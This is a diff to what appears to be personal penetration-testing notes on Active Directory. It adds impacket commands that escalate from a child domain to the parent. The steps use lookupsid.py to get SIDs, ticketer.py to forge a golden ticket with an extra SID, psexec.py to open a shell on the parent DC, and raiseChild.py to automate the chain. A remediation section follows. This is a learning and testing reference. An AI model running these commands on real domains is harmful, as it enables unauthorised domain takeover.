@@ -159,8 +159,25 @@ We can then perform something like a [[#DCSync]] attack if we have chosen a grou
 This can also be done in linux:
 - we can use [[#Using secretsdump.py|secretsdump.py]] to perform a DCSync attack to get the nthash for krbtgt.
 - We can use `lookupsid.py [domain]/[our-user]@[child-dc-ip] | grep 'Domain SID'` to get the child domain SID
-- 
+- We can use the same `lookupsid.py` as above but targeting the parent domain's DC IP to get the group SID (*you will need to construct the format as: [domain-sid]-[group-id]*)
 
+We can use [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) to create the golden ticket:
+```bash
+ticketer.py -nthash [krbtgt-nthash] -domain [child-domain] -domain-sid [child-dom-sid] -extra-sid [group-sid] [user]
+
+export KRB5CCNAME=[user].ccache
+```
+
+Gain a shell with:
+```bash
+psexec.py [child-domain]/[user]@[parent-dc-fqdn] -k -no-pass -target-ip [parent-dc-ip]
+```
+
+**Automated with** [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
+```bash
+raiseChild.py -target-exec [parent-dc-ip] [child-domain]/[our-privileged-user]
+```
+> This will automate the manual process above and the `-target-exec` will use `psexec` to open a shell. *Inside the script is a comment that lists out the workflow it uses*.
 ## Remediation and Detection
 ### Regular auditing for dangerous ACLs
 - Regularly check for dangerous ACL configurations and remove them
